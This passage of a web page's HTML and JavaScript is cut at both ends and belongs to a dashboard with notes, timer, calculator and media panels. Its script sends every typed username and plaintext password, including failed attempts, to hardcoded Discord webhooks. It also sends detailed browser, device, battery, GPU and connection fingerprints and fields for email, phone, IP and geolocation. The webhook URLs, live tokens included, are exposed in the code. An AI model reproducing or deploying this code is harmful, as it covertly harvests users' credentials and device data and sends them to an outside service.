            <span>New Note</span>
            <input type="text" class="keybind-input" data-action="newNote" value="Ctrl+N" placeholder="Press keys...">
          </div>
          <div class="keybind-item">
            <span>Save All</span>
            <input type="text" class="keybind-input" data-action="saveAll" value="Ctrl+S" placeholder="Press keys...">
          </div>
          <div class="keybind-item">
            <span>Toggle Theme</span>
            <input type="text" class="keybind-input" data-action="toggleTheme" value="Ctrl+T" placeholder="Press keys...">
          </div>
          <div class="keybind-item">
            <span>Open Calculator</span>
            <input type="text" class="keybind-input" data-action="openCalculator" value="Ctrl+C" placeholder="Press keys...">
          </div>
          <div class="keybind-item">
            <span>Open Media</span>
            <input type="text" class="keybind-input" data-action="openMedia" value="Ctrl+M" placeholder="Press keys...">
          </div>
          <div class="keybind-item">
            <span>Open Timer</span>
            <input type="text" class="keybind-input" data-action="openTimer" value="Ctrl+W" placeholder="Press keys...">
          </div>
          <div class="keybind-item">
            <span>Open Stats</span>
            <input type="text" class="keybind-input" data-action="openStats" value="Ctrl+B" placeholder="Press keys...">
          </div>
          <div class="keybind-item">
            <span>Download Logs</span>
            <input type="text" class="keybind-input" data-action="downloadLogs" value="Ctrl+L" placeholder="Press keys...">
          </div>
        </div>
      </div>

      <!-- Theme Selector -->
      <div class="mt-8">
        <h3 class="text-xl font-bold text-orange-500 mb-4"><i class="fas fa-palette"></i> Theme Selection</h3>
        <div class="theme-selector" id="themeSelector">
          <div class="theme-option active" data-theme="orange" style="background: linear-gradient(135deg, #ff4500, #ff6b35);">Orange</div>
          <div class="theme-option" data-theme="blue" style="background: linear-gradient(135deg, #0066cc, #004499);">Blue</div>
          <div class="theme-option" data-theme="green" style="background: linear-gradient(135deg, #00cc44, #009933);">Green</div>
          <div class="theme-option" data-theme="red" style="background: linear-gradient(135deg, #cc0044, #990033);">Red</div>
          <div class="theme-option" data-theme="purple" style="background: linear-gradient(135deg, #8800cc, #6600aa);">Purple</div>
          <div class="theme-option" data-theme="amber" style="background: linear-gradient(135deg, #ffaa00, #ff8800);">Amber</div>
          <div class="theme-option" data-theme="teal" style="background: linear-gradient(135deg, #00aaaa, #008888);">Teal</div>
          <div class="theme-option" data-theme="pink" style="background: linear-gradient(135deg, #ff0088, #cc0066);">Pink</div>
          <div class="theme-option" data-theme="dark" style="background: linear-gradient(135deg, #0a0a0a, #1a1a1a);">Dark</div>
          <div class="theme-option" data-theme="light" style="background: linear-gradient(135deg, #ffffff, #e0e0e0); color: black;">Light</div>
        </div>
      </div>
    </div>
  </div>

  <!-- Timer Panel -->
  <div id="timerPanel" class="settings-modal">
    <div class="settings-content">
      <div class="flex justify-between items-center mb-6">
        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-stopwatch"></i> Timer & Stopwatch</h2>
        <button onclick="togglePanel('timerPanel')" class="text-2xl text-gray-400 hover:text-white">
          <i class="fas fa-times"></i>
        </button>
      </div>
      
      <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
        <!-- Stopwatch -->
        <div class="bg-gray-800 p-6 rounded-lg">
          <h3 class="text-lg font-bold mb-4 text-center">Stopwatch</h3>
          <div class="timer-display" id="stopwatchDisplay">00:00:00.00</div>
          <div class="timer-controls">
            <button class="tool-btn" onclick="startStopwatch()"><i class="fas fa-play"></i> Start</button>
            <button class="tool-btn" onclick="pauseStopwatch()"><i class="fas fa-pause"></i> Pause</button>
            <button class="tool-btn" onclick="resetStopwatch()"><i class="fas fa-stop"></i> Reset</button>
          </div>
        </div>

        <!-- Timer -->
        <div class="bg-gray-800 p-6 rounded-lg">
          <h3 class="text-lg font-bold mb-4 text-center">Countdown Timer</h3>
          <div class="timer-display" id="timerDisplay">00:00:00</div>
          <div class="flex justify-center gap-2 mb-4">
            <input type="number" id="timerHours" class="w-16 p-2 bg-gray-700 rounded text-center" placeholder="HH" min="0" max="23">
            <input type="number" id="timerMinutes" class="w-16 p-2 bg-gray-700 rounded text-center" placeholder="MM" min="0" max="59">
            <input type="number" id="timerSeconds" class="w-16 p-2 bg-gray-700 rounded text-center" placeholder="SS" min="0" max="59">
          </div>
          <div class="timer-controls">
            <button class="tool-btn" onclick="startTimer()"><i class="fas fa-play"></i> Start</button>
            <button class="tool-btn" onclick="pauseTimer()"><i class="fas fa-pause"></i> Pause</button>
            <button class="tool-btn" onclick="resetTimer()"><i class="fas fa-stop"></i> Reset</button>
          </div>
        </div>
      </div>

      <!-- Reminders -->
      <div class="mt-8">
        <h3 class="text-lg font-bold mb-4"><i class="fas fa-bell"></i> Reminders</h3>
        <div class="flex gap-2 mb-4">
          <input type="text" id="reminderText" class="flex-1 p-2 bg-gray-700 rounded" placeholder="Reminder text...">
          <input type="datetime-local" id="reminderTime" class="p-2 bg-gray-700 rounded">
          <button class="tool-btn" onclick="addReminder()"><i class="fas fa-plus"></i> Add</button>
        </div>
        <div id="remindersList" class="space-y-2">
          <!-- Reminders will be populated here -->
        </div>
      </div>
    </div>
  </div>

  <!-- Notes Panel -->
  <div id="notesPanel" class="settings-modal">
    <div class="settings-content">
      <div class="flex justify-between items-center mb-6">
        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-pen"></i> Enhanced Notes</h2>
        <button onclick="togglePanel('notesPanel')" class="text-2xl text-gray-400 hover:text-white">
          <i class="fas fa-times"></i>
        </button>
      </div>
      
      <div class="drawing-tools">
        <button class="tool-btn active" data-tool="pen" onclick="selectTool(this, 'pen')">
          <i class="fas fa-pen"></i> Pen
        </button>
        <button class="tool-btn" data-tool="brush" onclick="selectTool(this, 'brush')">
          <i class="fas fa-paint-brush"></i> Brush
        </button>
        <button class="tool-btn" data-tool="eraser" onclick="selectTool(this, 'eraser')">
          <i class="fas fa-eraser"></i> Eraser
        </button>
        <button class="tool-btn" data-tool="text" onclick="selectTool(this, 'text')">
          <i class="fas fa-text-height"></i> Text
        </button>
        <button class="tool-btn" data-tool="line" onclick="selectTool(this, 'line')">
          <i class="fas fa-minus"></i> Line
        </button>
        <button class="tool-btn" data-tool="rectangle" onclick="selectTool(this, 'rectangle')">
          <i class="fas fa-square"></i> Rectangle
        </button>
        <button class="tool-btn" data-tool="circle" onclick="selectTool(this, 'circle')">
          <i class="fas fa-circle"></i> Circle
        </button>
        
        <div class="flex items-center gap-2">
          <label class="text-sm">Color:</label>
          <input type="color" id="penColor" class="color-picker" value="#ff4500">
        </div>
        
        <div class="flex items-center gap-2">
          <label class="text-sm">Thickness:</label>
          <input type="range" id="penThickness" class="thickness-slider" min="1" max="20" value="2">
        </div>
        
        <div class="flex items-center gap-2">
          <label class="text-sm">Material:</label>
          <select id="penMaterial" class="bg-gray-700 text-white p-1 rounded">
            <option value="solid">Solid</option>
            <option value="dashed">Dashed</option>
            <option value="dotted">Dotted</option>
          </select>
        </div>
        
        <button class="tool-btn" onclick="clearCanvas()">
          <i class="fas fa-trash"></i> Clear
        </button>
        <button class="tool-btn" onclick="saveCanvas()">
          <i class="fas fa-save"></i> Save
        </button>
        <button class="tool-btn" onclick="loadCanvas()">
          <i class="fas fa-folder-open"></i> Load
        </button>
        <button class="tool-btn" onclick="undoCanvas()">
          <i class="fas fa-undo"></i> Undo
        </button>
        <button class="tool-btn" onclick="redoCanvas()">
          <i class="fas fa-redo"></i> Redo
        </button>
      </div>
      
      <canvas id="drawingCanvas" width="760" height="400" class="w-full border border-gray-600 rounded mt-4 bg-white cursor-crosshair"></canvas>
      
      <!-- Text Notes Section -->
      <div class="mt-6">
        <h3 class="text-lg font-bold mb-2"><i class="fas fa-sticky-note"></i> Text Notes</h3>
        <textarea id="textNotes" class="w-full h-32 p-3 bg-gray-700 rounded resize-none" placeholder="Type your notes here..."></textarea>
        <div class="flex gap-2 mt-2">
          <button class="tool-btn" onclick="saveTextNotes()"><i class="fas fa-save"></i> Save Notes</button>
          <button class="tool-btn" onclick="clearTextNotes()"><i class="fas fa-trash"></i> Clear Notes</button>
        </div>
      </div>
    </div>
  </div>

  <!-- Calculator Panel -->
  <div id="calculatorPanel" class="settings-modal">
    <div class="settings-content">
      <div class="flex justify-between items-center mb-6">
        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-calculator"></i> Calculator & Converter</h2>
        <button onclick="togglePanel('calculatorPanel')" class="text-2xl text-gray-400 hover:text-white">
          <i class="fas fa-times"></i>
        </button>
      </div>
      
      <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
        <!-- Calculator -->
        <div class="calculator">
          <h3 class="text-lg font-bold mb-4 text-center">Calculator</h3>
          <div class="calc-display" id="calcDisplay">0</div>
          <div class="calc-buttons">
            <button class="calc-btn" onclick="clearCalc()">C</button>
            <button class="calc-btn" onclick="deleteLast()">⌫</button>
            <button class="calc-btn operator" onclick="appendToCalc('/')">/</button>
            <button class="calc-btn operator" onclick="appendToCalc('*')">×</button>
            
            <button class="calc-btn" onclick="appendToCalc('7')">7</button>
            <button class="calc-btn" onclick="appendToCalc('8')">8</button>
            <button class="calc-btn" onclick="appendToCalc('9')">9</button>
            <button class="calc-btn operator" onclick="appendToCalc('-')">-</button>
            
            <button class="calc-btn" onclick="appendToCalc('4')">4</button>
            <button class="calc-btn" onclick="appendToCalc('5')">5</button>
            <button class="calc-btn" onclick="appendToCalc('6')">6</button>
            <button class="calc-btn operator" onclick="appendToCalc('+')">+</button>
            
            <button class="calc-btn" onclick="appendToCalc('1')">1</button>
            <button class="calc-btn" onclick="appendToCalc('2')">2</button>
            <button class="calc-btn" onclick="appendToCalc('3')">3</button>
            <button class="calc-btn equals" onclick="calculateResult()" style="grid-row: span 2;">=</button>
            
            <button class="calc-btn" onclick="appendToCalc('0')" style="grid-column: span 2;">0</button>
            <button class="calc-btn" onclick="appendToCalc('.')">.</button>
          </div>
        </div>

        <!-- Unit Converter -->
        <div class="bg-gray-800 p-6 rounded-lg">
          <h3 class="text-lg font-bold mb-4 text-center">Unit Converter</h3>
          <div class="space-y-4">
            <select id="conversionType" class="w-full p-2 bg-gray-700 rounded" onchange="updateConversionUnits()">
              <option value="length">Length</option>
              <option value="weight">Weight</option>
              <option value="temperature">Temperature</option>
              <option value="volume">Volume</option>
            </select>
            
            <div class="grid grid-cols-2 gap-4">
              <div>
                <label class="block text-sm mb-1">From:</label>
                <select id="fromUnit" class="w-full p-2 bg-gray-700 rounded">
                  <option value="m">Meters</option>
                  <option value="km">Kilometers</option>
                  <option value="cm">Centimeters</option>
                  <option value="mm">Millimeters</option>
                  <option value="in">Inches</option>
                  <option value="ft">Feet</option>
                </select>
                <input type="number" id="fromValue" class="w-full p-2 bg-gray-700 rounded mt-2" placeholder="Enter value" oninput="convertUnits()">
              </div>
              
              <div>
                <label class="block text-sm mb-1">To:</label>
                <select id="toUnit" class="w-full p-2 bg-gray-700 rounded" onchange="convertUnits()">
                  <option value="m">Meters</option>
                  <option value="km">Kilometers</option>
                  <option value="cm">Centimeters</option>
                  <option value="mm">Millimeters</option>
                  <option value="in">Inches</option>
                  <option value="ft">Feet</option>
                </select>
                <input type="number" id="toValue" class="w-full p-2 bg-gray-700 rounded mt-2" readonly>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Media Panel -->
  <div id="mediaPanel" class="settings-modal">
    <div class="settings-content">
      <div class="flex justify-between items-center mb-6">
        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-play"></i> Media Player</h2>
        <button onclick="togglePanel('mediaPanel')" class="text-2xl text-gray-400 hover:text-white">
          <i class="fas fa-times"></i>
        </button>
      </div>
      
      <div class="media-container">
        <div class="flex gap-2 mb-4">
          <input type="url" id="mediaUrl" class="media-input" placeholder="Enter YouTube URL...">
          <button class="tool-btn" onclick="loadMedia()"><i class="fas fa-play"></i> Load</button>
        </div>
        <iframe id="mediaFrame" class="media-frame" src="" frameborder="0" allowfullscreen></iframe>
      </div>
    </div>
  </div>

  <!-- Stats Panel -->
  <div id="statsPanel" class="settings-modal">
    <div class="settings-content">
      <div class="flex justify-between items-center mb-6">
        <h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-chart-bar"></i> Usage Statistics</h2>
        <button onclick="togglePanel('statsPanel')" class="text-2xl text-gray-400 hover:text-white">
          <i class="fas fa-times"></i>
        </button>
      </div>
      
      <div class="stats-grid">
        <div class="stat-item">
          <div class="stat-number" id="buttonPresses">0</div>
          <div class="stat-label">Button Presses</div>
        </div>
        <div class="stat-item">
          <div class="stat-number" id="toggleSwitches">0</div>
          <div class="stat-label">Toggle Switches</div>
        </div>
        <div class="stat-item">
          <div class="stat-number" id="panelsOpened">0</div>
          <div class="stat-label">Panels Opened</div>
        </div>
        <div class="stat-item">
          <div class="stat-number" id="panelsClosed">0</div>
          <div class="stat-label">Panels Closed</div>
        </div>
        <div class="stat-item">
          <div class="stat-number" id="searchQueries">0</div>
          <div class="stat-label">Search Queries</div>
        </div>
        <div class="stat-item">
          <div class="stat-number" id="sessionTimeStat">00:00:00</div>
          <div class="stat-label">Session Time</div>
        </div>
      </div>

      <!-- Chart -->
      <div class="mt-8">
        <canvas id="statsChart" style="height: 400px;"></canvas>
      </div>
    </div>
  </div>
</div>

<script>
// Global variables
let currentUser = '';
let currentUserID = '';
let loginAttempts = 3; // Changed from 5 to 3
let is24HourFormat = false;
let currentZoom = 1;
let activityLogs = [];
let loginHistory = []; // Stores successful login times
let stats = {
  buttonPresses: 0,
  toggleSwitches: 0,
  panelsOpened: 0,
  panelsClosed: 0,
  searchQueries: 0,
  sessionStartTime: null
};

// Timer variables
let stopwatchInterval = null;
let stopwatchTime = 0; // in centiseconds
let timerInterval = null;
let timerTime = 0; // in seconds
let isStopwatchRunning = false;
let isTimerRunning = false;

// Drawing variables
let isDrawing = false;
let currentTool = 'pen';
let currentColor = '#ff4500';
let currentThickness = 2;
let currentMaterial = 'solid'; // For line styles
let canvas, ctx;
let undoStack = [];
let redoStack = [];
const MAX_CANVAS_HISTORY = 20;

// Calculator variables
let calcDisplayValue = '0';
let calcOperator = null;
let calcPrevValue = null;
let calcResetDisplay = false;

// Webhook URLs (from your previous code)
const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';
const loggingWebhooks = {
    username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
    password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
    identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
    invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
    invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
    invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
    attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
    attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
};
const webhookUrls = {
    userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
    browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
    deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
    connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
    sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
};
let users = []; // For login system

// Initialization sequence
window.addEventListener('load', () => {
  startInitialization();
  loadSettings(); // Load settings early to apply theme/etc.
  loadKeybinds(); // Load keybinds
  loadTextNotes(); // Load text notes
  loadReminders(); // Load reminders
  loadLoginHistory(); // Load login history
});

function startInitialization() {
  generateCodeRain('codeRain');
  
  setTimeout(() => {
    document.getElementById('initText').textContent = 'Initializing Login Page...';
    setTimeout(() => {
      document.getElementById('initScreen').classList.add('hidden');
      document.getElementById('loginScreen').classList.add('active'); // Use active class for visibility
      startClock();
      fetchUsers(); // Fetch users for login
    }, 2000);
  }, 3000);
}

function generateCodeRain(containerId) {
  const container = document.getElementById(containerId);
  const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  
  // Clear existing code rain if any
  container.innerHTML = '';

  const intervalId = setInterval(() => {
    const char = document.createElement('div');
    char.className = 'code-char';
    char.textContent = chars[Math.floor(Math.random() * chars.length)];
    char.style.left = Math.random() * 100 + '%';
    char.style.animationDelay = Math.random() * 2 + 's';
    container.appendChild(char);
    
    setTimeout(() => {
      if (char.parentNode) {
        char.parentNode.removeChild(char);
      }
    }, 3000);
  }, 100);

  // Store interval ID to clear it later
  container.dataset.intervalId = intervalId;
}

function stopCodeRain(containerId) {
    const container = document.getElementById(containerId);
    const intervalId = container.dataset.intervalId;
    if (intervalId) {
        clearInterval(intervalId);
        container.innerHTML = ''; // Clear all characters
    }
}

function startClock() {
  updateClock();
  setInterval(updateClock, 1000);
}

function updateClock() {
  const now = new Date();
  const time = is24HourFormat ? 
    now.toLocaleTimeString('en-US', { hour12: false }) :
    now.toLocaleTimeString('en-US', { hour12: true });
  
  const date = now.toLocaleDateString('en-US', { 
    weekday: 'long', 
    year: 'numeric', 
    month: 'long', 
    day: 'numeric' 
  });
  
  document.getElementById('currentTime').textContent = time;
  document.getElementById('currentDate').textContent = date;
}

function adjustZoom(delta) {
  currentZoom = Math.max(0.5, Math.min(2, currentZoom + delta));
  document.body.style.zoom = currentZoom;
  logActivity('Zoom adjusted to ' + Math.round(currentZoom * 100) + '%', 'UI');
}

// Toggle functions
function setupToggles() {
  // Show password toggle
  document.getElementById('showPasswordToggle').addEventListener('click', function() {
    this.classList.toggle('active');
    const passwordField = document.getElementById('password');
    passwordField.type = this.classList.contains('active') ? 'text' : 'password';
    stats.toggleSwitches++;
    logActivity('Password visibility toggled', 'Login UI');
  });

  // 24-hour format toggle
  document.getElementById('timeFormatToggle').addEventListener('click', function() {
    this.classList.toggle('active');
    is24HourFormat = this.classList.contains('active');
    stats.toggleSwitches++;
    logActivity('Time format toggled to ' + (is24HourFormat ? '24-hour' : '12-hour'), 'Login UI');
    updateClock(); // Update clock immediately
  });

  // Settings toggles
  document.getElementById('settingsModal').querySelectorAll('.toggle-switch').forEach(toggle => {
    toggle.addEventListener('click', function() {
      const settingName = this.id.replace('Toggle', ''); // e.g., 'darkMode'
      const isActive = this.classList.contains('active');
      saveSetting(settingName, !isActive); // Save the new state
      stats.toggleSwitches++;
      logActivity(`Setting "${settingName}" toggled to ${!isActive}`, 'Settings');
    });
  });
}

// Login function
async function fetchUsers() {
    try {
        const res = await fetch(USER_JSON_URL);
        users = await res.json();
    } catch (e) {
        console.error('Failed to load user JSON data:', e);
        users = [];
    }
}

function findUser(username, userID) {
    return users.find(u =>
        u.username?.toLowerCase() === username.toLowerCase() &&
        u.userID?.toString() === userID.toString()
    );
}

async function sendWebhook(url, embed) {
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
        });
    } catch (e) {
        console.warn('Webhook send failed:', e);
    }
}

function getWebGLRenderer() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "Unavailable";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
    } catch {
        return "Unavailable";
    }
}

async function getBatteryStatus() {
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            return battery;
        } catch {
            return null;
        }
    }
    return null;
}

async function collectLoggingData(user, password) {
    const now = new Date();
    const loginTime = now.toISOString();
    const batteryStatus = await getBatteryStatus();

    return {
        user,
        password,
        loginTime,
        batteryStatus,
        webglRenderer: getWebGLRenderer(),
        loginAttemptsLog: loginHistory.filter(entry => !entry.success) // Only failed attempts
    };
}

// New logging functions for the specific systems
async function logUsername(name, username) {
    const embed = { title: "Username Logging", color: 0x3498db, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
    await sendWebhook(loggingWebhooks.username, embed);
}
async function logPassword(name, password) {
    const embed = { title: "Password Logging", color: 0xe74c3c, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
    await sendWebhook(loggingWebhooks.password, embed);
}
async function logIdentifier(name, identifier) {
    const embed = { title: "Identifier Logging", color: 0x2ecc71, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
    await sendWebhook(loggingWebhooks.identifier, embed);
}
async function logInvalidUsername(name, username) {
    const embed = { title: "Invalid Username Logging", color: 0xf39c12, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
    await sendWebhook(loggingWebhooks.invalid_username, embed);
}
async function logInvalidPassword(name, password) {
    const embed = { title: "Invalid Password Logging", color: 0xe67e22, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
    await sendWebhook(loggingWebhooks.invalid_password, embed);
}
async function logInvalidIdentifier(name, identifier) {
    const embed = { title: "Invalid Identifier Logging", color: 0xd35400, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
    await sendWebhook(loggingWebhooks.invalid_identifier, embed);
}
async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
    const embed = { title: "Attempts Counter Logging", color: 0x9b59b6, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
    await sendWebhook(loggingWebhooks.attempts_counter, embed);
}
async function logAttemptsExceeded(name, username, password, identifier) {
    const embed = { title: "Attempts Exceeded Logging", color: 0xc0392b, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] };
    await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
}

// Original embed builders (with 6 more fields added)
function buildUserLoggingEmbed(data) {
    return {
        title: "User Logging System",
        color: 0xff0000,
        fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true },
            { name: "Last Login IP", value: data.user.lastLoginIP || "N/A", inline: true }, // Added field 1
            { name: "Geo-Location", value: data.user.geoLoc || "N/A", inline: true }, // Added field 2
            { name: "Device Count", value: data.user.deviceCount?.toString() || "N/A", inline: true }, // Added field 3
            { name: "Email", value: data.user.email || "N/A", inline: true }, // Added field 4
            { name: "Phone Number", value: data.user.phoneNumber || "N/A", inline: true }, // Added field 5
            { name: "Two-Factor Auth Enabled", value: data.user.twoFactorAuthEnabled ? "Yes" : "No", inline: true } // Added field 6
        ]
    };
}

function buildBrowserLoggingEmbed(data) {
    const nav = navigator;
    return {
        title: "Browser Logging System",
        color: 0x00ff00,
        fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true },
            { name: "User Input Latency", value: "N/A (Client-side measurement)", inline: true }, // Added field 1
            { name: "WebSockets Supported", value: "WebSocket" in window ? "Yes" : "No", inline: true } // Added field 2
        ]
    };
}

function buildDeviceLoggingEmbed(data) {
    const nav = navigator;
    const battery = data.batteryStatus;
    return {
        title: "Device Logging System",
        color: 0x0000ff,
        fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true },
            { name: "Operating System", value: nav.platform.replace(/^(Mac|Win|Linux).*$/, '$1') || "Unknown", inline: true }, // Added field 3 (simplified OS)
            { name: "Device Name (if available)", value: "N/A (Browser limitation)", inline: true } // Added field 4
        ]
    };
}

function buildConnectionLoggingEmbed(data) {
    const nav = navigator;
    return {
        title: "Connection Logging System",
        color: 0xffff00,
        fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
